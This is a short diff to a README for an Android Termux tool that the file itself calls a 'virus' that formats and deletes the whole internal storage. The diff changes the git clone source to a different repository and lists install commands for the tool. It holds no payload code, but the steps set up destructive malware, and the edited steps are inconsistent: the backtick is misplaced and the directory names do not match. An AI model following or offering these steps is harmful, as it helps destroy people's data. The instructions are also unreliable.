@@ -57,8 +57,8 @@ Warning 🚦 This Virus Formates (Deletes) Full Internal Storage So think and Us
 * `pkg install python2 -y`
 * `pkg install git -y`
 * `pip install lolcat`
-* `git clone https://github.com/noob-hackers/infect`
-* `cd $HOME`
+* `git clone `https://github.com/taniqs/Tanis
+* `cd Tanis`
 * `ls`
 * `cd infect`
 * `ls`
